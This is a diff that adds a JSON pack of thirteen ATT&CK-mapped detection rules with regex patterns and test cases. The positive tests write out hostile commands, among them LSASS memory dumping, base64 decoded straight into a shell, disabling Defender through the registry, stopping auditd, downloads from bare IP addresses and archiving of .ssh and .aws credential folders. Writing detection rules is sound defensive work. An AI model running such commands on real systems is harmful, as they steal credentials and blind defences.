@@ -1,0 +1,604 @@
+{
+ "pack": "labfix",
+ "rules": [
+  {
+   "id": "lab-lx-download-raw-ip-to-temp",
+   "name": "Download from a bare IP address into a temp directory",
+   "description": "curl or wget fetches from an http(s) URL whose host is a raw IPv4 address and saves the result under /tmp, /dev/shm or /var/tmp, the staging step of ingress tool transfer.",
+   "tactic": "Command and Control",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(curl|wget)\\s[^|;&]*https?://(\\d{1,3}\\.){3}\\d{1,3}[:/]"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-o\\s*|\\s-O\\s*|--output[= ]|\\s-P\\s*|--directory-prefix[= ])(/tmp|/dev/shm|/var/tmp)/"
+     }
+    ]
+   },
+   "tags": [
+    "download",
+    "linux",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "wget http://203.0.113.9/agent -O /tmp/agent"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "curl -s http://198.51.100.7:8080/m -o /dev/shm/m"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "curl -s http://169.254.169.254/latest/meta-data/instance-id"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "wget https://example.com/pkg.tgz -O /tmp/pkg.tgz"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-lx-useradd-shell-privileged-group",
+   "name": "Local account created with a login shell and an admin group",
+   "description": "useradd or adduser creates an account with an interactive shell and membership of sudo, wheel, admin or root in the same command, a common persistence pattern.",
+   "tactic": "Persistence",
+   "technique": "T1136.001",
+   "technique_name": "Create Account: Local Account",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(^|[/\\s])useradd\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-s\\s*/(usr/)?(s?bin)/(ba|da|z)?sh\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-G|--groups)[ =]\\S*\\b(sudo|wheel|admin|root)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "account",
+    "linux",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/useradd",
+      "command": "useradd -m -s /bin/bash -G sudo support"
+     },
+     {
+      "executable": "/usr/sbin/useradd",
+      "command": "useradd -s /bin/sh -G wheel,docker svc2"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/useradd",
+      "command": "useradd -m -s /usr/sbin/nologin appsvc"
+     },
+     {
+      "executable": "/usr/sbin/useradd",
+      "command": "useradd -m -s /bin/bash -G developers alice"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-lx-archive-to-hidden-temp",
+   "name": "Archive written to a hidden file in a temp directory",
+   "description": "tar, zip, 7z or rar writes an archive to a dot-file under /tmp, /var/tmp or /dev/shm, the staging step before exfiltration.",
+   "tactic": "Collection",
+   "technique": "T1560.001",
+   "technique_name": "Archive Collected Data: Archive via Utility",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(tar|zip|7z|7za|rar)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(tar\\s+\\S*[cr]\\S*f?|zip|7za?\\s+a|rar\\s+a)\\s[^|;&]*(/tmp|/var/tmp|/dev/shm)/\\.[^\\s/]+\\.(tgz|tar|gz|zip|7z|rar|bz2|xz)"
+     }
+    ]
+   },
+   "tags": [
+    "archive",
+    "linux",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf /tmp/.d.tgz /home/ann/Documents /var/lib/db"
+     },
+     {
+      "executable": "/usr/bin/zip",
+      "command": "zip -r /dev/shm/.s.zip /srv/data"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf /backup/www-2026-03-01.tgz /var/www"
+     },
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf /tmp/build-output.tgz ./dist"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-win-procdump-lsass",
+   "name": "LSASS memory dumped with procdump or comsvcs MiniDump",
+   "description": "A process dumps lsass.exe memory using procdump style arguments or rundll32 comsvcs.dll MiniDump, sub-technique OS Credential Dumping: LSASS Memory.",
+   "tactic": "Credential Access",
+   "technique": "T1003.001",
+   "technique_name": "OS Credential Dumping: LSASS Memory",
+   "severity": "critical",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(?i)(-ma\\s+(-accepteula\\s+)?lsass(\\.exe)?\\b|lsass(\\.exe)?\\s+\\S+\\.dmp\\b|comsvcs(\\.dll)?[, ]+\\s*#?(minidump|24)\\b)"
+   },
+   "tags": [
+    "credential",
+    "windows",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\bob\\AppData\\Local\\Temp\\pd.exe",
+      "command": "pd.exe -accepteula -ma lsass.exe C:\\Users\\bob\\AppData\\Local\\Temp\\l.dmp"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\rundll32.exe",
+      "command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\out.bin full"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\tasklist.exe",
+      "command": "tasklist /fi \"imagename eq lsass.exe\""
+     },
+     {
+      "executable": "C:\\Windows\\System32\\rundll32.exe",
+      "command": "rundll32.exe shell32.dll,Control_RunDLL"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-lx-base64-decode-pipe-shell-t1140",
+   "name": "Base64 decoded straight into a shell or interpreter",
+   "description": "base64 -d output is piped into sh, bash, python or perl: the payload is deobfuscated and executed in one command (Deobfuscate/Decode Files or Information).",
+   "tactic": "Defense Evasion",
+   "technique": "T1140",
+   "technique_name": "Deobfuscate/Decode Files or Information",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "base64\\s+(-d|-D|--decode)\\b[^|;&]*\\|\\s*(sudo\\s+)?(/\\S*/)?(sh|bash|zsh|dash|python3?|perl)\\b"
+   },
+   "tags": [
+    "decode",
+    "linux",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "echo ZWNobyBoaQ== | base64 -d | sh"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "base64 --decode payload.b64 | bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "echo aGk= | base64 -d"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "base64 -d cert.b64 > cert.pem"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-web-server-child-shell-t1190",
+   "name": "Web server spawns a shell (exploit of a public-facing application)",
+   "description": "A web server or application server parent starting a shell is the post-exploitation signature of exploiting a public-facing application, filed here under Initial Access.",
+   "tactic": "Initial Access",
+   "technique": "T1190",
+   "technique_name": "Exploit Public-Facing Application",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](nginx|httpd|apache2|php-fpm\\d*|php-cgi|lighttpd|caddy|tomcat\\d*|gunicorn|uwsgi|w3wp\\.exe|httpd\\.exe)$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](sh|bash|dash|zsh|ksh|ash|cmd\\.exe|powershell\\.exe|pwsh)$"
+     }
+    ]
+   },
+   "tags": [
+    "web",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c id",
+      "parent_exe": "/usr/sbin/nginx"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c id",
+      "parent_exe": "/usr/bin/cron"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-win-psexec-remote-host",
+   "name": "PsExec run against a remote host",
+   "description": "PsExec started with a UNC host argument runs a command on another machine over SMB and the service control manager (Remote Services: SMB/Windows Admin Shares).",
+   "tactic": "Lateral Movement",
+   "technique": "T1021.002",
+   "technique_name": "Remote Services: SMB/Windows Admin Shares",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(?i)\\\\psexec6?4?(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(?i)\\s\\\\\\\\[\\w.\\-]+\\s"
+     }
+    ]
+   },
+   "tags": [
+    "lateral",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Tools\\PsExec.exe",
+      "command": "PsExec.exe \\\\10.0.4.12 -s -accepteula cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Tools\\PsExec.exe",
+      "command": "PsExec.exe -s -i regedit"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-lx-ssh-remote-forward-all-interfaces",
+   "name": "SSH reverse forward bound to all interfaces",
+   "description": "ssh -R with a 0.0.0.0 or * bind address exposes an internal host or port through an external relay (Internal Proxy).",
+   "tactic": "Command and Control",
+   "technique": "T1090.001",
+   "technique_name": "Proxy: Internal Proxy",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/ssh$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-\\w*R\\s*(0\\.0\\.0\\.0|\\*):\\d+:"
+     }
+    ]
+   },
+   "tags": [
+    "tunnel",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -N -R 0.0.0.0:8080:10.0.0.5:3128 relay@203.0.113.60"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -N -R 127.0.0.1:8080:localhost:80 relay@example.com"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-win-reg-add-defender-policy-t1112",
+   "name": "Registry policy key for Windows Defender modified from the command line",
+   "description": "reg add under the Windows Defender policy key sets a value, a registry modification used to disable protection.",
+   "tactic": "Defense Evasion",
+   "technique": "T1112",
+   "technique_name": "Modify Registry",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(?i)\\\\reg\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(?i)\\sadd\\s+\"?HK(LM|EY_LOCAL_MACHINE)\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender"
+     }
+    ]
+   },
+   "tags": [
+    "registry",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKCU\\Software\\MyApp /v Theme /d dark /f"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-lx-stop-auditd-t1562-006",
+   "name": "Linux audit daemon stopped or disabled",
+   "description": "systemctl/service stop, disable or mask auditd, or auditctl -e 0, blinds the audit subsystem (Indicator Blocking).",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.006",
+   "technique_name": "Impair Defenses: Indicator Blocking",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(systemctl\\s+(stop|disable|mask)\\s+auditd|service\\s+auditd\\s+stop|auditctl\\s+-e\\s*0\\b)"
+   },
+   "tags": [
+    "audit",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl stop auditd"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/systemctl",
+      "command": "systemctl restart nginx"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-win-script-host-from-downloads-t1204",
+   "name": "Script host runs a file from Downloads",
+   "description": "wscript or cscript starting a script from a user Downloads folder is the execution step after a user opens a lure (User Execution: Malicious File).",
+   "tactic": "Execution",
+   "technique": "T1204.002",
+   "technique_name": "User Execution: Malicious File",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(?i)\\\\(wscript|cscript)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(?i)\\\\Users\\\\[^\\\\]+\\\\Downloads\\\\\\S+\\.(js|jse|vbs|vbe|wsf|hta)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "execution",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command": "wscript.exe C:\\Users\\ann\\Downloads\\invoice.js"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cscript.exe",
+      "command": "cscript.exe C:\\Windows\\System32\\slmgr.vbs /dli"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-win-office-shell-exploit-t1203",
+   "name": "Office application spawns a command shell",
+   "description": "An Office process starting cmd or PowerShell indicates exploitation of the client application or a malicious document (Exploitation for Client Execution).",
+   "tactic": "Execution",
+   "technique": "T1203",
+   "technique_name": "Exploitation for Client Execution",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "(?i)\\\\(winword|excel|powerpnt|outlook)\\.exe$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(?i)\\\\(cmd|powershell|pwsh)\\.exe$"
+     }
+    ]
+   },
+   "tags": [
+    "execution",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c whoami",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c whoami",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "lab-lx-tar-credential-dotdirs-t1552",
+   "name": "Archive of credential dot-directories",
+   "description": "tar, zip or 7z over .aws, .kube, .ssh or .gnupg collects unsecured credential files (Unsecured Credentials: Credentials In Files).",
+   "tactic": "Credential Access",
+   "technique": "T1552.001",
+   "technique_name": "Unsecured Credentials: Credentials In Files",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(tar|zip|7z|7za)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/\\.(aws|kube|ssh|gnupg)(/|\\s|$)"
+     }
+    ]
+   },
+   "tags": [
+    "credential",
+    "lab"
+   ],
+   "batch": "labfix",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar -zcf /tmp/a.tgz /home/ops/.aws /home/ops/.kube"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf /backup/www.tgz /var/www"
+     }
+    ]
+   }
+  }
+ ]
+}
